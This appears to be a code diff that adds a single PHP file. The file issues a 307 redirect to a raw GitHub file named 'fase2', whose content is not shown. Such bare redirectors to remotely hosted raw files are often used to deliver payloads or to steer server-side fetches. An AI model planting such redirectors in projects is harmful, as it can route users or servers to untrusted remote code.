@@ -1,0 +1,1 @@
+<?php header("Location:  https://raw.githubusercontent.com/mortal251/plutoes/main/fase2", true, 307) ;?>
